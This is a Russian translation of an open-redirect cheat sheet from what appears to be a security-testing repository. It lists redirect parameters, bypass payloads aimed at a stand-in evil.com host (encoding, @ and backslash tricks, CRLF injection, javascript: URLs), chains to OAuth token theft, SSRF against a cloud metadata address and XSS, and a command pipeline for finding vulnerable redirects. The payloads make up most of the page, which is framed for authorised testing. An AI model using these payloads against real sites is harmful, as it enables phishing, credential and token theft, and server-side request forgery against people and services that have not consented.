<a id="-open-redirect-cheatsheet"></a>
# 🔀 Справочник по открытым перенаправлениям

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

> **Уточнение к оригиналу.** Показанные URL — примеры для проверки, а не универсальные обходы. Их результат зависит от декодирования, проверки адреса и контекста перехода; [стандарт URL](https://url.spec.whatwg.org/) отдельно определяет разбор userinfo, хоста, пути и обратной косой черты. Наличие доверенного имени в строке не означает, что это хост назначения. Варианты javascript:/data: не равнозначны обычному HTTP-перенаправлению: выполнение зависит от способа навигации и ограничений браузера.

> **О сочетаниях атак.** Кража токена OAuth не следует из одного изменения redirect_uri: [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1) требует точного сопоставления зарегистрированных URI и запрещает открытые перенаправления; ущерб зависит от потока и его защит. Для цепочки SSRF серверный HTTP-клиент должен переходить по перенаправлению, а для XSS — небезопасно обрабатывать схему назначения. Исходные примеры сохранены дословно; подпись о краже токенов ниже описывает возможный результат, а не гарантию.

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

<a id="-what-is-open-redirect"></a>
## 🎯 Что такое открытое перенаправление

**Открытое перенаправление (Open Redirect)** позволяет злоумышленнику направить пользователя на вредоносный сайт через ссылку на доверенный домен. Его могут использовать для фишинга и в сочетании с другими уязвимостями.

---

<a id="-common-parameters"></a>
## 🔍 Распространённые параметры

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

<a id="-payloads"></a>
## 💉 Полезные нагрузки

<a id="basic"></a>
### Базовые примеры
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

<a id="protocol-less"></a>
### Без указания схемы
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

<a id="using--symbol"></a>
### Использование символа @
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

<a id="backslash-tricks"></a>
### Приёмы с обратной косой чертой
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

<a id="url-encoding"></a>
### Кодирование URL
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

<a id="domain-confusion"></a>
### Путаница при проверке домена
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

<a id="null-bytes"></a>
### Нулевые байты
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

<a id="crlf-injection"></a>
### Внедрение CRLF
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

<a id="javascript-redirect"></a>
### Перенаправление через JavaScript
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Способы обхода ограничений

<a id="if-whitelist-checked"></a>
### При проверке списка разрешённых адресов
```
# Обход проверки поддомена
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Обход проверки пути
https://target.com/https://evil.com
https://target.com//evil.com
```

<a id="if-only-https-allowed"></a>
### Если разрешён только HTTPS
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

<a id="localhost-tricks"></a>
### Приёмы с localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

<a id="-chaining-open-redirects"></a>
## 🔗 Сочетание открытых перенаправлений с другими атаками

<a id="oauth-token-theft"></a>
### Кража токенов OAuth
```
https://target.com/oauth?redirect_uri=https://evil.com
→ Кража токенов OAuth
```

<a id="ssrf-chain"></a>
### Сочетание с SSRF
```
https://target.com/redirect?url=http://169.254.169.254/
```

<a id="xss-chain"></a>
### Сочетание с XSS
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

| Тип полезной нагрузки | Пример |
|--------------|---------|
| Базовый | `//evil.com` |
| Символ @ | `https://target.com@evil.com` |
| Кодирование | `https:%2f%2fevil.com` |
| Путаница при проверке домена | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

<a id="-tools"></a>
## 🛠️ Инструменты

```bash
# Шаблоны GF
gau target.com | gf redirect

# Ручная проверка
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Открытые перенаправления: PortSwigger](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

<p align="center">
  <b>🔀 Исследуйте уязвимости перенаправлений!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
